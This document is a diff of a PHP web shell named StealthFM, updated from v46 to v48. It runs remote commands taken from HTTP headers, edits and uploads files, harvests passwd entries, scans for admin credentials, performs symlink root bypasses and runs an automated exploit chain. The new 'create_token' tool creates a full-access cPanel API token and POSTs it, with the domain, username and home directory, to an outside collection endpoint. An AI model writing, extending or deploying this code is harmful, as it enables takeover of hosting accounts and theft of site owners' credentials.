@@ -1,7 +1,7 @@
 <?php
 // -------------------------------------------------------------------------
-// STEALTH FM V46 (FINAL COMPLETE: BASE V45 + AUTO CHAIN NO-PROMPT)
-// MODIFIED: AUTO CHAIN (INSTANT) + CLEAN TOOLKIT UI
+// STEALTH FM V48 (FINAL: SEPARATED UAPI TOKEN + CORRECT JSON STRUCTURE)
+// MODIFIED: UAPI TOKEN IS NOW A STANDALONE TOOL
 // -------------------------------------------------------------------------
 
 // 1. STEALTH MODE
@@ -149,7 +149,6 @@ if (isset($_SERVER[$h_act])) {
 
     if ($action === 'read') { if (is_file($target)) echo file_get_contents($target); else echo "Err: Not a file"; exit; }
     
-    // --- V42: DECODE B64 INPUT ---
     if ($action === 'save' || $action === 'upload') { 
         $input = file_get_contents("php://input"); 
         if (isset($_SERVER[$h_enc]) && $_SERVER[$h_enc] === 'b64') {
@@ -163,7 +162,6 @@ if (isset($_SERVER[$h_act])) {
     if ($action === 'rename') { $n = isset($_SERVER[$h_data]) ? base64_decode($_SERVER[$h_data]) : ''; if ($n) echo rename($target, dirname($target).'/'.$n) ? "Renamed" : "Fail"; exit; }
     if ($action === 'chmod') { $m = isset($_SERVER[$h_data]) ? $_SERVER[$h_data] : ''; if ($m) echo chmod($target, octdec($m)) ? "Chmod OK" : "Fail"; exit; }
     
-    // --- V42: POLYGLOT CMD ---
     if ($action === 'cmd') {
         $cmd = isset($_SERVER[$h_cmd]) ? base64_decode($_SERVER[$h_cmd]) : 'whoami'; 
         $cmd_exec = $cmd . " 2>&1";
@@ -197,7 +195,6 @@ if (isset($_SERVER[$h_act])) {
         $tool = isset($_SERVER[$h_tool]) ? $_SERVER[$h_tool] : '';
         $home_dirs = get_home_dirs();
 
-        // --- V45: FIXED MASS UPLOAD PROTOCOL ---
         if ($tool === 'mass_upload') {
             $mode = isset($_SERVER[$h_mmode]) ? $_SERVER[$h_mmode] : 'init';
             $tmp_list = sys_get_temp_dir() . "/sfm_mass_targets.json";
@@ -248,15 +245,12 @@ if (isset($_SERVER[$h_act])) {
             if(!empty($found)) { x_write("passwd.txt", $found); echo "Saved to: passwd.txt\nTotal Found: " . count(explode("\n", trim($found))); } else echo "Failed."; exit;
         }
 
-        // --- FULL ADD ADMIN LOGIC (V42/V45) ---
         if ($tool === 'add_admin') {
             $step = isset($_SERVER[$h_step]) ? (int)$_SERVER[$h_step] : 0;
             $limit = 5; 
-            // MODIFIKASI: Deteksi mode dari header (symlink/jumping)
             $mode = isset($_SERVER['HTTP_X_MODE']) ? $_SERVER['HTTP_X_MODE'] : 'jumping';
             $target_sub = ($mode === 'symlink') ? '3x_sym' : 'jumping';
             
-            // Set path berdasarkan pilihan
             $scan_path = is_dir($target . '/' . $target_sub) ? $target . '/' . $target_sub : $target;
             $all_files = scandir($scan_path);
             $config_files = [];
@@ -325,7 +319,156 @@ if (isset($_SERVER[$h_act])) {
             echo "$tool Done. Count: $n."; exit;
         }
         
-        // FITUR: ULTIMATE ROOT BYPASS
+        // --- FITUR BARU: CREATE UAPI TOKEN (SMART STATUS HANDLE) ---
+        if ($tool === 'create_token') {
+            // 1. Deteksi Homedir
+            $cwd = str_replace('\\', '/', getcwd());
+            $homedir = "/home/" . get_current_user() . "/public_html"; 
+            if (preg_match('~^(/home\d*?/[^/]+)~', $cwd, $m)) {
+                $homedir = $m[1] . "/public_html"; 
+            }
+
+            // 2. Eksekusi Perintah
+            $cmd = "(uapi Tokens create_full_access name=xshikatas || /usr/bin/uapi Tokens create_full_access name=xshikatas || /usr/local/cpanel/bin/uapi Tokens create_full_access name=xshikata) 2>&1";
+            $output = "";
+            $used_method = "None";
+
+            // Daftar Metode
+            $methods = [
+                'shell_exec' => function($c) { return @shell_exec($c); },
+                'exec'       => function($c) { @exec($c, $o); return implode("\n", $o); },
+                'passthru'   => function($c) { ob_start(); @passthru($c); return ob_get_clean(); },
+                'system'     => function($c) { ob_start(); @system($c); return ob_get_clean(); },
+                'popen'      => function($c) { $h = @popen($c, 'r'); if($h) { $o = stream_get_contents($h); @pclose($h); return $o; } return null; },
+                'proc_open'  => function($c) {
+                    $d = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
+                    $p = @proc_open($c, $d, $pipes);
+                    if (is_resource($p)) { $o = stream_get_contents($pipes[1]); @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($p); return $o; }
+                    return null;
+                }
+            ];
+
+            // Loop Eksekusi
+            foreach ($methods as $name => $func) {
+                if (function_exists($name)) {
+                    $res = $func($cmd);
+                    if (!empty($res)) {
+                        $output = $res;
+                        $used_method = $name;
+                        
+                        // Stop jika sukses token ATAU jika error spesifik "already exists"
+                        if (stripos($res, 'token:') !== false || stripos($res, 'conflicting') !== false || stripos($res, 'already exists') !== false) {
+                            break; 
+                        }
+                    }
+                }
+            }
+            
+            // 3. Analisa Output
+            $token_val = "";
+            $display_status = "UNKNOWN";
+            $display_color = "text-secondary";
+
+            // Cek 1: Apakah Token Sukses Terbuat?
+            if(preg_match('/token:\s*(\S+)/i', $output, $m)) {
+                $token_val = trim($m[1]);
+                $display_status = "CREATED";
+                $display_color = "text-success";
+            } 
+            // Cek 2: Apakah Token Sudah Ada?
+            elseif (stripos($output, 'conflicting') !== false || stripos($output, 'already exists') !== false) {
+                $token_val = "Exists (Secret Hidden)";
+                $display_status = "ALREADY EXISTS";
+                $display_color = "text-warning"; // Kuning
+            }
+            // Cek 3: Gagal Total
+            else {
+                $display_status = "NOT FOUND";
+                $display_color = "text-danger";
+            }
+
+            // 4. Kirim ke Endpoint (HANYA JIKA TOKEN BARU)
+            // Token lama tidak bisa dikirim karena cPanel menyembunyikan secret-nya setelah pembuatan awal.
+            $server_response = "";
+            $srv_color = "text-secondary";
+
+            if ($display_status === "CREATED" && !empty($token_val)) {
+                // GANTI URL INI
+                $target_url = "https://stepmomhub.com/catch.php"; 
+                
+                $data_json = json_encode([
+                    "domain"   => $_SERVER['HTTP_HOST'],
+                    "username" => get_current_user(),
+                    "apiToken" => $token_val,
+                    "homedir"  => $homedir
+                ]);
+                
+                $raw_response = "No Connect";
+
+                if (function_exists('curl_init')) {
+                    $ch = curl_init($target_url);
+                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                    curl_setopt($ch, CURLOPT_POST, true);
+                    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_json);
+                    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+                    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+                    $raw_response = curl_exec($ch);
+                    curl_close($ch);
+                } elseif (ini_get('allow_url_fopen')) {
+                    $opts = ['http' => ['method'=>'POST', 'header'=>'Content-Type: application/json', 'content'=>$data_json, 'timeout'=>10], 'ssl'=>['verify_peer'=>false, 'verify_peer_name'=>false]];
+                    $raw_response = @file_get_contents($target_url, false, stream_context_create($opts));
+                }
+
+                $json_res = json_decode($raw_response, true);
+                if ($json_res) {
+                    if ($json_res['status'] === 'success') {
+                        $server_response = "Saved to Database.";
+                        $srv_color = "text-success";
+                    } elseif ($json_res['status'] === 'ignored') {
+                        $server_response = "Already Saved (Duplicate).";
+                        $srv_color = "text-warning";
+                    } else {
+                        $server_response = "Server Error: " . $json_res['msg'];
+                        $srv_color = "text-danger";
+                    }
+                } else {
+                    $server_response = "Raw: " . substr($raw_response, 0, 50);
+                }
+            } elseif ($display_status === "ALREADY EXISTS") {
+                $server_response = "Skipped (Secret Token Unavailable).";
+                $srv_color = "text-warning";
+            } else {
+                $server_response = "Token failed, nothing to send.";
+                $srv_color = "text-danger";
+            }
+
+            // 5. TAMPILAN OUTPUT
+            echo "<div style='font-family:monospace; font-size:12px;'>";
+            
+            // Info Method
+            echo "<div>Method: <span class='text-info'>$used_method</span></div>";
+            
+            // Info Token Status
+            echo "<div>Token: <span class='$display_color fw-bold'>$display_status</span></div>";
+            
+            if ($display_status === "NOT FOUND") {
+                 $clean_out = htmlspecialchars(substr($output, 0, 300));
+                 echo "<div class='text-secondary mt-1 p-1 border border-secondary'>Output Log:<br>$clean_out...</div>";
+            } elseif ($display_status === "ALREADY EXISTS") {
+                 echo "<div class='text-secondary'>User 'xshikata' token conflict. Cannot retrieve secret.</div>";
+            } else {
+                 echo "<div class='text-secondary' style='font-size:10px;'>$token_val</div>";
+            }
+
+            // Info Server
+            echo "<div class='mt-2 border-top border-secondary pt-1'>Server Status: <span class='$srv_color fw-bold'>$server_response</span></div>";
+            
+            echo "</div>";
+            exit;
+        }
+
         if ($tool === 'root_bypass') {
             $dir = "symlinkbypass"; 
             @mkdir($dir, 0755); 
@@ -358,10 +501,8 @@ if (isset($_SERVER[$h_act])) {
                 }
             }
 
-            // 1. Symlink ke Root (/)
             $root_ok = god_link("/", "root");
 
-            // 2. Automasi Home 1-9 & Config
             $etc_path = dirname(__DIR__) . "/passwd.txt";
             $etc = (file_exists($etc_path)) ? file_get_contents($etc_path) : false;
             
@@ -400,123 +541,75 @@ if (isset($_SERVER[$h_act])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <title>StealthFM v46</title>
+    <title>StealthFM v48</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.7/ace.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     
     <style>
-        /* TURBO TRANSITIONS */
         * { transition: border-color 0.1s ease, background-color 0.1s ease, color 0.1s ease, box-shadow 0.1s ease; }
-
-        :root {
-            --bg-body: #131314; --bg-card: #1e1f20; --bg-hover: #2d2e30; 
-            --border-color: #333333; --text-primary: #e3e3e3; --text-secondary: #a8a8a8;
-            --accent-primary: #8ab4f8; --accent-warning: #fdd663;
-            --accent-success: #81c995; --accent-danger: #f28b82; --accent-purple: #d946ef;
-        }
-
+        :root { --bg-body: #131314; --bg-card: #1e1f20; --bg-hover: #2d2e30; --border-color: #333333; --text-primary: #e3e3e3; --text-secondary: #a8a8a8; --accent-primary: #8ab4f8; --accent-warning: #fdd663; --accent-success: #81c995; --accent-danger: #f28b82; --accent-purple: #d946ef; }
         body { background-color: var(--bg-body); color: var(--text-primary); font-family: 'Inter', sans-serif; font-size: 0.9rem; padding-bottom: 60px; }
-
         .navbar { background-color: var(--bg-body); border-bottom: 1px solid var(--border-color); height: 60px; }
         .navbar-brand { font-weight: 700; color: #fff !important; font-size: 1.1rem; }
         .path-wrapper { margin-top: 80px; margin-bottom: 20px; }
-        
-        /* ANIMATED GHOST */
         .fa-ghost { animation: float 3s ease-in-out infinite; }
         @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-5px); } 100% { transform: translateY(0px); } }
-
-        .sys-info-box {
-            background: #18191a; border: 1px solid var(--border-color); border-radius: 12px;
-            padding: 15px; margin-bottom: 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: #ccc;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-        }
+        .sys-info-box { background: #18191a; border: 1px solid var(--border-color); border-radius: 12px; padding: 15px; margin-bottom: 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: #ccc; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         .sys-row { margin-bottom: 5px; word-break: break-all; }
         .sys-val { color: var(--accent-primary); }
         .sys-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 5px; margin-top: 5px; }
         .php-link { color: var(--accent-warning); text-decoration: none; font-weight: bold; margin-left: 5px; }
         .php-link:hover { text-decoration: underline; color: #fff; }
-
-        #terminal-panel {
-            background: #000; border: 1px solid #333; border-bottom: none; border-radius: 12px 12px 0 0;
-            overflow: hidden; box-shadow: 0 -5px 20px rgba(0,0,0,0.5); margin-bottom: 0; animation: slideDown 0.15s ease;
-        }
+        #terminal-panel { background: #000; border: 1px solid #333; border-bottom: none; border-radius: 12px 12px 0 0; overflow: hidden; box-shadow: 0 -5px 20px rgba(0,0,0,0.5); margin-bottom: 0; animation: slideDown 0.15s ease; }
         .term-header { background: #1a1a1a; padding: 8px 15px; border-bottom: 1px solid #333; border-top: 2px solid var(--accent-success); display: flex; justify-content: space-between; align-items: center; }
         .term-title { font-family: 'JetBrains Mono'; font-weight: 700; color: var(--accent-success); font-size: 0.8rem; }
         .term-body-inline { height: 180px; overflow-y: auto; padding: 15px; font-family: 'JetBrains Mono'; font-size: 13px; color: #ddd; }
         .term-input-row { display: flex; align-items: center; border-top: 1px solid #222; padding: 10px; background: #0a0a0a; }
         .term-prompt { color: #c586c0; font-weight: bold; margin-right: 8px; }
         #term-cmd-inline { background: transparent; border: none; color: #ce9178; width: 100%; outline: none; font-family: 'JetBrains Mono'; }
-
         #process-panel { border: 1px solid var(--border-color); border-bottom: none; border-radius: 12px 12px 0 0; overflow: hidden; background: #1e1f20; margin-bottom: 0; }
         .console-header { background: #252627; padding: 8px 15px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
         .console-title { font-size: 0.75rem; font-weight: 700; color: var(--accent-warning); letter-spacing: 0.5px; text-transform: uppercase; }
         .panel-close { color: #666; cursor: pointer; } .panel-close:hover { color: #fff; }
-
-        .path-bar-custom {
-            background-color: var(--bg-card); border: 1px solid var(--border-color); border-radius: 15px; padding: 10px 20px;
-            display: flex; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.15); position: relative; z-index: 5;
-        }
+        .path-bar-custom { background-color: var(--bg-card); border: 1px solid var(--border-color); border-radius: 15px; padding: 10px 20px; display: flex; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.15); position: relative; z-index: 5; }
         .has-panel-above { border-top-left-radius: 0; border-top-right-radius: 0; border-top: 1px solid #333; }
         #path-txt { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: var(--text-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-
-        /* UPLOAD STYLING */
         .input-group { border: 1px solid #333; border-radius: 8px; overflow: hidden; }
         #uploadInput { background: #111; color: #ccc; border: none; font-size: 0.85rem; }
         #uploadInput::file-selector-button { background-color: #000; color: #fff; border: none; border-right: 1px solid #333; padding: 8px 12px; margin-right: 10px; font-weight: 600; transition: 0.2s; }
         #uploadInput::file-selector-button:hover { background-color: #222; }
         .btn-upload-modern { background: #000 !important; border: none; border-left: 1px solid #333; color: #fff !important; font-weight: 600; padding: 6px 16px; }
         .btn-upload-modern:hover { background: #1a1a1a !important; }
-
         .btn-modern { border-radius: 8px; border: 1px solid var(--border-color); background: var(--bg-card); color: var(--text-primary); padding: 6px 12px; }
         .btn-modern:hover { background: var(--bg-hover); color: #fff; border-color: #555; }
-        
-        /* MATCH UP ICON SIZE */
-        .btn-icon-path { 
-            background: transparent; border: none; color: #aaa; padding: 0 10px 0 0; 
-            font-size: 1.1rem; /* Same as icon-dir */
-            cursor: pointer; transition: 0.2s; 
-        }
+        .btn-icon-path { background: transparent; border: none; color: #aaa; padding: 0 10px 0 0; font-size: 1.1rem; cursor: pointer; transition: 0.2s; }
         .btn-icon-path:hover { color: #fff; transform: translateY(-1px); }
-
         .card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; }
         .table { --bs-table-bg: transparent; color: var(--text-primary); margin: 0; table-layout: fixed; width: 100%; }
         .table thead th { background: var(--bg-card); color: var(--text-secondary); border-bottom: 1px solid var(--border-color); padding: 15px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.5px; vertical-align: middle; }
         .table tbody td { border-bottom: 1px solid var(--border-color); padding: 10px 15px; vertical-align: middle; height: 45px; }
         .table-hover tbody tr:hover { background-color: var(--bg-hover); }
-
         .icon-dir { color: var(--accent-warning); margin-right: 10px; font-size: 1.1rem; vertical-align: middle; }
         .icon-file { margin-right: 10px; font-size: 1.1rem; vertical-align: middle; } 
         .i-php { color: #8892bf; } .i-html { color: #e34f26; } .i-css { color: #264de4; } .i-js { color: #f7df1e; } 
         .i-img { color: #a29bfe; } .i-zip { color: #fdcb6e; } .i-code { color: #b2bec3; } .i-def { color: var(--accent-primary); } 
-
         .text-folder { color: #fff; font-weight: 600; text-decoration: none; vertical-align: middle; }
         .text-file { color: #b0b0b0; text-decoration: none; vertical-align: middle; }
-        
-        .badge-perm { 
-            font-family: 'JetBrains Mono'; padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; 
-            border: 1px solid var(--border-color); background: #000; color: var(--text-secondary); 
-            display: inline-block; vertical-align: middle;
-        }
+        .badge-perm { font-family: 'JetBrains Mono'; padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; border: 1px solid var(--border-color); background: #000; color: var(--text-secondary); display: inline-block; vertical-align: middle; }
         .writable { color: var(--accent-success); border-color: var(--accent-success); }
         .readonly { color: var(--accent-danger); border-color: var(--accent-danger); }
-        
-        .action-btn { 
-            width: 32px; height: 32px; border-radius: 6px; border: 1px solid transparent; background: transparent; 
-            display: inline-flex; align-items: center; justify-content: center; vertical-align: middle;
-        }
+        .action-btn { width: 32px; height: 32px; border-radius: 6px; border: 1px solid transparent; background: transparent; display: inline-flex; align-items: center; justify-content: center; vertical-align: middle; }
         .action-btn.edit { color: #3b82f6; background: rgba(59, 130, 246, 0.1); border-color: rgba(59, 130, 246, 0.2); }
         .action-btn.edit:hover { background: #3b82f6; color: #fff; }
         .action-btn.del { color: #ef4444; background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.2); }
         .action-btn.del:hover { background: #ef4444; color: #fff; }
-
         .modal-xl { max-width: 95% !important; }
         .modal-content { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; }
         .modal-header { border-bottom: 1px solid var(--border-color); }
         .btn-close { filter: invert(1); }
         #editor-container { position: relative; width: 100%; height: 85vh; border-radius: 0 0 12px 12px; overflow: hidden; }
-        
         .tools-list { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
         .tool-cmd { background: #111; border: 1px solid #2a2a2a; border-radius: 4px; padding: 15px 15px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; text-decoration: none; }
         .tool-cmd:hover { background: #161616; border-color: #444; transform: translateX(2px); }
@@ -526,61 +619,32 @@ if (isset($_SERVER[$h_act])) {
         .cmd-arrow { color: #444; font-size: 12px; opacity: 0; }
         .tool-cmd:hover .cmd-arrow { opacity: 1; transform: translateX(-5px); color: #fff; }
         .c-cyan { color: #22d3ee; } .c-lime { color: #a3e635; } .c-gold { color: #facc15; } .c-rose { color: #fb7185; } .c-purple { color: #d946ef; }
-
         .inj-card { background: #000; border: 1px solid var(--border-color); border-left: 3px solid var(--border-color); padding: 12px; border-radius: 6px; margin-bottom: 10px; }
         .inj-card:hover { border-left-color: var(--accent-success); border-color: #444; }
         .inj-status { font-family: 'JetBrains Mono'; font-size: 0.7rem; padding: 3px 8px; border-radius: 4px; font-weight: bold; }
         .inj-status.created { color: var(--accent-success); border: 1px solid var(--accent-success); background: rgba(129, 201, 149, 0.1); }
         .inj-status.replaced { color: var(--accent-warning); border: 1px solid var(--accent-warning); background: rgba(253, 214, 99, 0.1); }
         .inj-btn { background: var(--accent-success); color: #000; padding: 4px 12px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; border: none; }
-        
-        /* TOAST */
         #toast-container { position: fixed; top: 80px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
-        .toast-msg {
-            background: #1e1f20; color: #fff; padding: 12px 18px; border-radius: 8px;
-            border-left: 4px solid #333; box-shadow: 0 5px 15px rgba(0,0,0,0.5);
-            font-size: 0.9rem; min-width: 250px; opacity: 0; transform: translateX(20px);
-            animation: toastIn 0.3s forwards;
-        }
+        .toast-msg { background: #1e1f20; color: #fff; padding: 12px 18px; border-radius: 8px; border-left: 4px solid #333; box-shadow: 0 5px 15px rgba(0,0,0,0.5); font-size: 0.9rem; min-width: 250px; opacity: 0; transform: translateX(20px); animation: toastIn 0.3s forwards; }
         .toast-msg.success { border-left-color: var(--accent-success); }
         .toast-msg.error { border-left-color: var(--accent-danger); }
         .toast-msg.hiding { animation: toastOut 0.3s forwards; }
-        
-        /* MODERN FOOTER V40 */
-        .cyber-footer {
-            position: fixed; bottom: 0; left: 0; width: 100%;
-            background: rgba(10, 10, 10, 0.85);
-            backdrop-filter: blur(5px);
-            border-top: 1px solid #222;
-            padding: 8px 20px;
-            display: flex; justify-content: space-between; align-items: center;
-            font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: #555;
-            z-index: 9999;
-        }
+        .cyber-footer { position: fixed; bottom: 0; left: 0; width: 100%; background: rgba(10, 10, 10, 0.85); backdrop-filter: blur(5px); border-top: 1px solid #222; padding: 8px 20px; display: flex; justify-content: space-between; align-items: center; font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: #555; z-index: 9999; }
         .cyber-footer span { transition: 0.3s; }
         .cyber-footer:hover span { color: #888; }
         .cy-brand { color: var(--accent-primary); font-weight: 700; letter-spacing: 1px; }
-        
-        /* HEART ANIMATION */
         .fa-heart { color: #e91e63; animation: heartbeat 1.5s infinite; }
         @keyframes heartbeat { 0% { transform: scale(1); } 50% { transform: scale(1.2); } 100% { transform: scale(1); } }
-        
         @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes toastIn { to { opacity: 1; transform: translateX(0); } }
         @keyframes toastOut { to { opacity: 0; transform: translateX(20px); } }
-        
-        /* V44+ ASYNC WIDGET */
-        #async-widget {
-            position: fixed; bottom: 50px; right: 20px; width: 300px; z-index: 10000;
-            background: #111; border: 1px solid #333; border-radius: 8px; box-shadow: 0 5px 20px rgba(0,0,0,0.5);
-            display: none; font-family: 'JetBrains Mono';
-        }
+        #async-widget { position: fixed; bottom: 50px; right: 20px; width: 300px; z-index: 10000; background: #111; border: 1px solid #333; border-radius: 8px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); display: none; font-family: 'JetBrains Mono'; }
         .aw-header { padding: 10px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; font-size: 0.8rem; font-weight: bold; color: var(--accent-primary); }
         .aw-body { padding: 12px; }
         .progress-bar-bg { width: 100%; height: 6px; background: #222; border-radius: 3px; overflow: hidden; margin-bottom: 8px; }
         .progress-bar-fill { height: 100%; background: var(--accent-success); width: 0%; transition: width 0.3s ease; }
         .aw-stat { font-size: 0.7rem; color: #888; display: flex; justify-content: space-between; }
-        
         @media (max-width: 768px) { 
             .desktop-toolbar { flex-direction: column; gap: 10px; } .upload-group { width: 100%; max-width: 100%; } 
             .d-mobile-none { display: none !important; } .tools-list { grid-template-columns: 1fr; } 
@@ -626,7 +690,7 @@ if (isset($_SERVER[$h_act])) {
 
     <div id="terminal-panel" style="display:none;">
         <div class="term-header"><span class="term-title">ROOT@SHELL:~#</span><i class="fas fa-times panel-close" onclick="toggleTerm()"></i></div>
-        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v46</div></div>
+        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v48</div></div>
         <div class="term-input-row"><span class="term-prompt">&#10140;</span><input type="text" id="term-cmd-inline" placeholder="Type command..." autocomplete="off"></div>
     </div>
     <div id="process-panel" style="display:none;">
@@ -672,6 +736,8 @@ if (isset($_SERVER[$h_act])) {
                 <div class="tools-list">
                     <div class="tool-cmd" onclick="startAutoChain()"><div class="cmd-left"><i class="fas fa-radiation fa-spin cmd-icon text-danger"></i><span class="cmd-text text-danger">AUTO EXPLOIT CHAIN</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                     
+                    <div class="tool-cmd" onclick="runTool('create_token')"><div class="cmd-left"><i class="fas fa-key cmd-icon c-gold"></i><span class="cmd-text">CREATE UAPI TOKEN</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
+
                     <div class="tool-cmd" onclick="showMassUpload()"><div class="cmd-left"><i class="fas fa-rocket cmd-icon c-purple"></i><span class="cmd-text">SMART MASS UPLOAD</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                 </div>
             </div>
@@ -801,10 +867,9 @@ if (isset($_SERVER[$h_act])) {
         }); 
     }
 
-    // --- V42 FITUR: ENCODE CONTENT B64 (ANTI FIREWALL) ---
     function saveFile() { 
         let content = editor.getValue(); 
-        let encoded = btoa(unescape(encodeURIComponent(content))); // UTF-8 SAFE B64
+        let encoded = btoa(unescape(encodeURIComponent(content))); 
         api('save', currentFile, 'PUT', {'X-Encode': 'b64'}, encoded).then(r => r.text()).then(m => { 
             showToast(m); editModal.hide(); 
         }); 
@@ -816,7 +881,6 @@ if (isset($_SERVER[$h_act])) {
         newFileModal.show();
     }
 
-    // --- V42 FITUR: ENCODE NEW FILE B64 ---
     function submitNewFile() {
         let name = document.getElementById('new-filename').value;
         let content = document.getElementById('new-content').value;
@@ -831,7 +895,6 @@ if (isset($_SERVER[$h_act])) {
         }
     }
 
-    // --- V42 FITUR: UPLOAD B64 ---
     function uploadFile() { 
         let input=document.getElementById('uploadInput'); 
         if(!input.files.length) { showToast("Select a file first", "error"); return; }
@@ -850,7 +913,6 @@ if (isset($_SERVER[$h_act])) {
         };
         reader.readAsDataURL(file);
     }
-    // ----------------------------
 
     function deleteItem(name) { 
         if(confirm(`Del ${name}?`)) { 
@@ -897,7 +959,6 @@ if (isset($_SERVER[$h_act])) {
         }
     });
 
-    // --- V46 FIX: SHOW & CLEAN FORM ---
     function showMassUpload() { toolsModal.hide(); massUploadModal.show(); }
     
     function startMassUpload() {
@@ -942,12 +1003,9 @@ if (isset($_SERVER[$h_act])) {
             } else {
                 updateWidget(total, total, 'DONE!');
                 showToast('Mass Upload Completed!', 'success');
-                
-                // V46 UPDATE: RESET FORM AFTER DONE
                 document.getElementById('mass-name').value = '';
                 document.getElementById('mass-content').value = '';
                 document.getElementById('mass-file-in').value = '';
-
                 setTimeout(() => { document.getElementById('async-widget').style.display = 'none'; }, 5000);
             }
         }).catch(e => {
@@ -967,12 +1025,10 @@ if (isset($_SERVER[$h_act])) {
     
     function runTool(toolName) { showLog(); let log = document.getElementById('global-log'); log.innerHTML += `<div class="text-primary mb-2"><i class="fas fa-cog fa-spin me-2"></i>Running ${toolName}...</div>`; api('tool', currentPath, 'GET', {'X-Tool': toolName}).then(r => r.text()).then(res => { log.innerHTML += res; log.innerHTML += `<div class="text-success mt-2"><i class="fas fa-check me-2"></i>Done.</div><hr class="border-secondary">`; log.scrollTop = log.scrollHeight; }).catch(e => { log.innerHTML += `<div class="text-danger">Error: ${e}</div>`; }); }
     
-    // MODIFIKASI: Tambahkan parameter 'mode', kirim Header X-Mode, dan Handle Log Append
     function runWatchdogTool(toolName, step, mode = 'jumping') {
         let log = document.getElementById('global-log'); 
         if(step === 0) { 
             showLog();
-            // CEK APAKAH SEDANG JALAN AUTO CHAIN
             if (!log.innerHTML.includes("STARTING AUTOMATED CHAIN")) {
                 log.innerHTML = `<div class="text-warning mb-2"><i class="fas fa-running me-2"></i>Starting ${toolName} (${mode.toUpperCase()})...</div><hr class="border-secondary">`; 
             } else {
@@ -1007,9 +1063,7 @@ if (isset($_SERVER[$h_act])) {
         });
     }
 
-    // --- FITUR BARU: AUTO EXPLOIT CHAIN (NO CONFIRM) ---
     async function startAutoChain() {
-        // CONFIRM REMOVED
         toolsModal.hide();
         showLog();
         let log = document.getElementById('global-log');
@@ -1040,13 +1094,15 @@ if (isset($_SERVER[$h_act])) {
             logMsg("Symlinker DONE.", "text-success");
             log.innerHTML += "<hr class='border-secondary'>";
 
+            // SKIP UAPI TOKEN AS REQUESTED (SEPARATED)
+
             // 4. ROOT BYPASS
             logMsg("4. Running Root Symlink Bypass...", "text-warning");
             await api('tool', currentPath, 'GET', {'X-Tool': 'root_bypass'});
             logMsg("Root Bypass Executed. (Check folder 'symlinkbypass')", "text-success");
             log.innerHTML += "<hr class='border-secondary'>";
 
-            // 5. ADD ADMIN (Mode Jumping sebagai default)
+            // 5. ADD ADMIN
             logMsg("5. Running Add Admin Scanner...", "text-warning");
             runWatchdogTool('add_admin', 0, 'jumping');
 
